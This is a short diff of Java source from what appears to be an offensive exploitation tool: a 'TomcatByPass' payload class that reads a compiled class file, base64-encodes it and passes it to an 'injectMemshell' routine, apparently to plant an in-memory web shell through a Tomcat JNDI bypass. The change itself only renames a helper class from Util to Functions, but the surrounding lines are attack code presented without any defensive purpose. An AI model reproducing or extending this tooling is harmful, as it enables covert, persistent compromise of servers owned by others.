@@ -1,6 +1,6 @@
 package com.bloom.payload;
 
-import com.bloom.util.Util;
+import com.bloom.util.Functions;
 import com.unboundid.util.Base64;
 import org.apache.naming.ResourceRef;
 import org.apache.wicket.util.file.Files;
@@ -38,7 +38,7 @@ public class TomcatByPass {
             try {
                 File file=new File(command.substring(5));
                 byte[] bytes = Files.readBytes(new File(command.substring(5)));
-                String result = Util.base64Encode(bytes);
+                String result = Functions.base64Encode(bytes);
                 code=injectMemshell(result,file.getName().substring(0,file.getName().lastIndexOf(".class")));
             } catch (Exception e) {
                 throw new RuntimeException(e);
@@ -78,7 +78,7 @@ public class TomcatByPass {
 
         String classCode = null;
         try{
-            classCode = Util.getClassCode(clazz);
+            classCode = Functions.getClassCode(clazz);
 
         }catch(Exception e){
             e.printStackTrace();
